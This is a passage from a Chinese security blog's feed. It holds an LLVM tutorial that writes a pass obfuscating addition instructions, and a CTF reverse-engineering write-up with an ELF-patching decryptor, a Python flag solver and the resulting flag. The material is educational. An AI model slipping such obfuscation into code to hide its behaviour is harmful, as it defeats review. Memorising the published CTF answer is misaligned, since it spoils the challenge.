0<span class="title">x7fff99766000</span> <span class="title">and</span> <span class="title">ASLR</span> <span class="title">slide</span> 0<span class="title">x991c000</span>.</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;通过macho/dyld.h提供的函数，程序可以获取到自身加载的dylib信息，这里做个简单记录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;
      
    
    </summary>
    
      <category term="macho/dyld" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/macho-dyld/"/>
    
    
      <category term="dyld" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"/>
    
      <category term="macho" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macho/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2017-06-25T13:14:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>cd where-you-want-llvm-to-live</div><div class="line"><span class="variable">$ </span>svn co <span class="symbol">http:</span>/<span class="regexp">/llvm.org/svn</span><span class="regexp">/llvm-project/llvm</span><span class="regexp">/trunk llvm</span></div></pre></td></tr></table></figure><p>我们选择clang作为LLVM前端，然后下载clang  </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>cd where-you-want-llvm-to-live</div><div class="line"><span class="variable">$ </span>cd llvm/tools</div><div class="line"><span class="variable">$ </span>svn co <span class="symbol">http:</span>/<span class="regexp">/llvm.org/svn</span><span class="regexp">/llvm-project/cfe</span><span class="regexp">/trunk clang</span></div></pre></td></tr></table></figure><p>下载编译运行库</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">cd</span> where-you-want-llvm-<span class="keyword">to</span>-live</div><div class="line">$ <span class="keyword">cd</span> llvm/projects</div><div class="line">$ svn <span class="keyword">co</span> http://llvm.org/svn/llvm-project/<span class="keyword">compiler</span>-rt/trunk <span class="keyword">compiler</span>-rt</div></pre></td></tr></table></figure><p>最后编译LLVM源码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>mkdir build</div><div class="line"><span class="variable">$ </span>cd build</div><div class="line"><span class="variable">$ </span>cmake -<span class="symbol">DCMAKE_BUILD_TYPE:</span>String=Release ../llvm/</div><div class="line"><span class="variable">$ </span>make</div></pre></td></tr></table></figure><p>编译时间可能有点长，编译完成之后进行安装</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta"><span class="meta-keyword">$sudo</span> make install</span></div></pre></td></tr></table></figure><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"hello LLVM\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include "llvm/Pass.h"</span></div><div class="line"><span class="comment">#include "llvm/IR/Function.h"</span></div><div class="line"><span class="comment">#include "llvm/Support/raw_ostream.h"</span></div><div class="line"><span class="comment">#include "llvm/IR/LegacyPassManager.h"</span></div><div class="line"><span class="comment">#include "llvm/Transforms/IPO/PassManagerBuilder.h"</span></div><div class="line"><span class="comment">#include "llvm/IR/Intrinsics.h"</span></div><div class="line"><span class="comment">#include "llvm/IR/Instructions.h"</span></div><div class="line"></div><div class="line">using <span class="keyword">namespace</span> <span class="title">llvm</span>;</div><div class="line"></div><div class="line"><span class="keyword">namespace</span> &#123;</div><div class="line">  <span class="title">struct</span> <span class="title">SkeletonPass</span> : <span class="title">public</span> <span class="title">FunctionPass</span> &#123;</div><div class="line">    <span class="title">static</span> <span class="title">char</span> <span class="title">ID</span>;</div><div class="line">    SkeletonPass() : FunctionPass(ID) &#123;&#125;</div><div class="line"></div><div class="line">    <span class="comment">// virtual bool runOnFunction(Function &amp;F) &#123;</span></div><div class="line">    <span class="comment">//   errs() &lt;&lt; "I saw a function called " &lt;&lt; F.getName() &lt;&lt; "!\n";</span></div><div class="line">    <span class="comment">//   return false;</span></div><div class="line">    <span class="comment">// &#125;</span></div><div class="line">    <span class="keyword">bool</span> runOnFunction(<span class="function"><span class="keyword">Function</span> &amp;<span class="title">F</span>) <span class="title">override</span> </span>&#123;</div><div class="line">            <span class="function"><span class="keyword">Function</span> *<span class="title">tmp</span> = &amp;<span class="title">F</span></span>;</div><div class="line">            <span class="comment">// 遍历函数中的所有基本块</span></div><div class="line">            <span class="keyword">for</span> (<span class="function"><span class="keyword">Function</span>::<span class="title">iterator</span> <span class="title">bb</span> = <span class="title">tmp</span>-&gt;<span class="title">begin</span><span class="params">()</span></span>; bb != tmp-&gt;end(); ++bb) &#123;</div><div class="line">                <span class="comment">// 遍历基本块中的每条指令</span></div><div class="line">                <span class="keyword">for</span> (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123;</div><div class="line">                    <span class="comment">// 是否是add指令</span></div><div class="line">                    <span class="keyword">if</span> (inst-&gt;isBinaryOp()) &#123;</div><div class="line">                        <span class="keyword">if</span> (inst-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                            ob_add(cast&lt;BinaryOperator&gt;(inst));</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">         </div><div class="line">        <span class="comment">// a+b === a-(-b)</span></div><div class="line">        <span class="keyword">bool</span> ob_add(BinaryOperator *bo) &#123;</div><div class="line">            BinaryOperator *op = <span class="keyword">NULL</span>;</div><div class="line">             </div><div class="line">            <span class="keyword">if</span> (bo-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                <span class="comment">// 生成 (－b)</span></div><div class="line">                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(<span class="number">1</span>), <span class="string">""</span>, bo);</div><div class="line">                <span class="comment">// 生成 a-(-b)</span></div><div class="line">                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(<span class="number">0</span>), op, <span class="string">""</span>, bo);</div><div class="line">                 </div><div class="line">                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());</div><div class="line">                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            <span class="comment">// 替换所有出现该指令的地方</span></div><div class="line">            bo-&gt;replaceAllUsesWith(op);</div><div class="line">        &#125;</div><div class="line">  &#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">char</span> SkeletonPass::ID = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// Automatically enable the pass.</span></div><div class="line"><span class="comment">// http://adriansampson.net/blog/clangpass.html</span></div><div class="line"><span class="keyword">static</span> void registerSkeletonPass(<span class="keyword">const</span> PassManagerBuilder &amp;,</div><div class="line">                         legacy::PassManagerBase &amp;PM) &#123;</div><div class="line">  PM.add(<span class="keyword">new</span> SkeletonPass());</div><div class="line">&#125;</div><div class="line"><span class="keyword">static</span> RegisterStandardPasses</div><div class="line">  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,</div><div class="line">                 registerSkeletonPass);</div></pre></td></tr></table></figure><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bool</span> runOnFunction(<span class="function"><span class="keyword">Function</span> &amp;<span class="title">F</span>) <span class="title">override</span> </span>&#123;</div><div class="line">            <span class="function"><span class="keyword">Function</span> *<span class="title">tmp</span> = &amp;<span class="title">F</span></span>;</div><div class="line">            <span class="comment">// 遍历函数中的所有基本块</span></div><div class="line">            <span class="keyword">for</span> (<span class="function"><span class="keyword">Function</span>::<span class="title">iterator</span> <span class="title">bb</span> = <span class="title">tmp</span>-&gt;<span class="title">begin</span><span class="params">()</span></span>; bb != tmp-&gt;end(); ++bb) &#123;</div><div class="line">                <span class="comment">// 遍历基本块中的每条指令</span></div><div class="line">                <span class="keyword">for</span> (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) &#123;</div><div class="line">                    <span class="comment">// 是否是add指令</span></div><div class="line">                    <span class="keyword">if</span> (inst-&gt;isBinaryOp()) &#123;</div><div class="line">                        <span class="keyword">if</span> (inst-&gt;getOpcode() == Instruction::Add) &#123;</div><div class="line">                            ob_add(cast&lt;BinaryOperator&gt;(inst));</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">             </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure><p>代码很简单，这里就不多说。我们使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$clang</span> -Xclang -load -Xclang build<span class="regexp">/skeleton/</span>libSkeletonPass.* something.c</div></pre></td></tr></table></figure><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="built_in">int</span> <span class="function"><span class="keyword">func</span><span class="params">(int a,int b)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> a + b<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line"><span class="built_in">int</span> c<span class="comment">;</span></div><div class="line">c = <span class="function"><span class="keyword">func</span><span class="params">(<span class="number">6</span>,<span class="number">9</span>)</span>;</span></div><div class="line">printf(<span class="string">"%d\n"</span>,c)<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> c<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="llvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/llvm/"/>
    
    
      <category term="llvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/llvm/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2017-05-31T02:31:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ENTRY 0x08048320</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_OFF 0x320</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> COUNT 0x432</span></div><div class="line">int main(int argc,char *argv[])&#123;</div><div class="line">    </div><div class="line">    Elf32_Ehdr ehdr;</div><div class="line">    unsigned char buf[<span class="built_in">COUNT</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="built_in">assert</span>(argc == <span class="number">2</span>);</div><div class="line">    int fd = open(argv[<span class="number">1</span>],O_RDWR);<span class="comment">//打开文件</span></div><div class="line">    <span class="built_in">assert</span>(fd&gt;<span class="number">0</span>);</div><div class="line">    </div><div class="line"><span class="built_in">assert</span>(lseek(fd,<span class="number">0</span>,SEEK_SET)!=-<span class="number">1</span>);<span class="comment">// 读取elf头</span></div><div class="line"><span class="built_in">assert</span>(read(fd,&amp;ehdr,<span class="built_in">sizeof</span>(ehdr)) == <span class="built_in">sizeof</span>(ehdr)); </div><div class="line">ehdr.e_entry = ENTRY;<span class="comment">//修改入口地址  </span></div><div class="line"></div><div class="line"><span class="built_in">assert</span>(lseek(fd,<span class="number">0</span>,SEEK_SET)!=-<span class="number">1</span>);<span class="comment">//回写elf头</span></div><div class="line"><span class="built_in">assert</span>(write(fd,&amp;ehdr,<span class="built_in">sizeof</span>(ehdr)) == <span class="built_in">sizeof</span>(ehdr));  </div><div class="line">   </div><div class="line">    <span class="comment">//解密</span></div><div class="line">    <span class="built_in">assert</span>(lseek(fd,FILE_OFF,SEEK_SET)!=-<span class="number">1</span>);<span class="comment">//读取被加密的代码</span></div><div class="line">    <span class="built_in">assert</span>(read(fd,buf,<span class="built_in">COUNT</span>) == <span class="built_in">COUNT</span>);</div><div class="line">    int i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(i&lt;<span class="built_in">COUNT</span>)&#123;</div><div class="line">        buf[i] = (buf[i]^<span class="number">66</span>)&lt;&lt;<span class="number">5</span> | (buf[i]^<span class="number">66</span>)&gt;&gt;<span class="number">3</span>;</div><div class="line"> i++; </div><div class="line">&#125;</div><div class="line"></div><div class="line">    <span class="built_in">assert</span>(lseek(fd,FILE_OFF,SEEK_SET)!=-<span class="number">1</span>);<span class="comment">//写入正确代码</span></div><div class="line">    <span class="built_in">assert</span>(write(fd,buf,<span class="built_in">COUNT</span>) == <span class="built_in">COUNT</span>);</div></pre></td></tr></table></figure><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF<span class="number">-8</span> -*-</div><div class="line">from __future__ <span class="keyword">import</span> print_function  </div><div class="line"><span class="keyword">import</span> sys</div><div class="line">def getflag():</div><div class="line">    <span class="built_in">print</span>(<span class="string">"[i]start to encrypt key"</span>)</div><div class="line">        </div><div class="line">    key = [<span class="number">0x73</span>,<span class="number">0x8d</span>,<span class="number">0xf2</span>,<span class="number">0x4c</span>,<span class="number">0xc7</span>,<span class="number">0xd4</span>,<span class="number">0x7b</span>,<span class="number">0xf7</span>,<span class="number">0x18</span>,<span class="number">0x32</span>,<span class="number">0x71</span>,<span class="number">0x0d</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,<span class="number">0x67</span>,<span class="number">0x4f</span>,<span class="number">0x7f</span>,<span class="number">0x0b</span>,<span class="number">0x6d</span>]</div><div class="line">    encryptKey = []</div><div class="line">        </div><div class="line">    <span class="built_in">print</span>(<span class="string">"encryptKey=["</span>, end=<span class="string">""</span>)</div><div class="line">    <span class="keyword">for</span> idx in <span class="keyword">range</span>(<span class="built_in">len</span>(key)):</div><div class="line">        encryptKey.<span class="built_in">append</span>(key[idx] ^ <span class="number">0x20</span>)</div><div class="line">        <span class="built_in">print</span>(<span class="string">"%x "</span> % encryptKey[idx], end=<span class="string">""</span>)</div><div class="line">    <span class="built_in">print</span>(<span class="string">"]"</span>)  </div><div class="line">        </div><div class="line"></div><div class="line">    flag = []</div><div class="line">    <span class="built_in">print</span>(<span class="string">"[i]find the flag"</span>)</div><div class="line">    <span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="built_in">len</span>(encryptKey)):</div><div class="line">        count = <span class="number">0x00</span></div><div class="line">        while(count &lt;= <span class="number">0x7f</span>):</div><div class="line">            one = count &gt;&gt; (((<span class="number">0</span> &gt;&gt; <span class="number">0x1d</span>) + i) &amp; <span class="number">0x7</span> - (<span class="number">0</span> &gt;&gt; <span class="number">0x1d</span>))</div><div class="line">            two = count &lt;&lt; (<span class="number">0x8</span> - (((<span class="number">0</span> &gt;&gt; <span class="number">0x1d</span>) + i) &amp; <span class="number">0x7</span> - (<span class="number">0</span> &gt;&gt; <span class="number">0x1d</span>)))</div><div class="line">            <span class="keyword">if</span>((((one | two) ^ i) &amp; <span class="number">0xff</span>) == encryptKey[i]):</div><div class="line">                flag.<span class="built_in">append</span>(count)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            count = count + <span class="number">1</span></div><div class="line">                </div><div class="line">    <span class="built_in">print</span>(<span class="string">"flag = "</span>,end=<span class="string">""</span>)</div><div class="line">    <span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="built_in">len</span>(flag)):</div><div class="line">        <span class="built_in">print</span>(<span class="string">"%c"</span> % flag[i], end=<span class="string">""</span>)   </div><div class="line">        </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    key = getflag()</div></pre></td></tr></table></figure><p>最后运行程序得到flag</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[i]start to encrypt <span class="type">key</span></div><div class="line">encryptKey=[<span class="number">53</span> ad d2 <span class="number">6</span>c e7 f4 <span class="number">5</span>b d7 <span class="number">38</span> <span class="number">12</span> <span class="number">51</span> <span class="number">2</span>d ef fc <span class="number">47</span> <span class="number">6</span>f <span class="number">5</span>f <span class="number">2</span>b <span class="number">4</span>d ]</div><div class="line">[i]find the flag</div><div class="line">flag = SYC&#123;&gt;&gt;Wh06m1&gt;&gt;R0Ot&#125;</div></pre></td></tr></table></figure><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>一道高中数学题的思考？</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/"/>
